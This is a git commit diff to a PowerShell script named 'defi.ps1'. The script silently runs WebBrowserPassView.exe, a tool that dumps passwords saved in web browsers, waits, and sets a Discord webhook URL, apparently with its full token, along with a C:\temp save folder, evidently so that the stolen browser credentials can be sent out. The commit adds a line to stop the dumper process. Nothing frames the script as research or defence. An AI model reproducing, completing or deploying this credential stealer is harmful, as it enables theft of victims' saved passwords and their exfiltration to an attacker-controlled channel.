1cf50d563dd003220a7014eb3629cb56886c8581
pedrito12a <153040660+pedrito12a@users.noreply.github.com>
2023-12-26 03:01:35 +0100

    Update defi.ps1

--- defi.ps1
+++ defi.ps1
@@ -12,6 +12,8 @@ Start-Process -FilePath .\WebBrowserPassView.exe -Wait -WindowStyle Hidden
 
 Start-Sleep -Seconds 40
 
+Stop-Process -FilePath .\WebBrowserPassView.exe
+
 $hookurl='https://discord.com/api/webhooks/1180337343920615434/dPohBhRKx_M_MeRIEQQjdOsPTydHKpwg_Vt6nOJU2ZeREXnDfQXV08laAiP2I45nQLBj'
 $fileSaveDir = 'C:\temp'
 $date = get-date
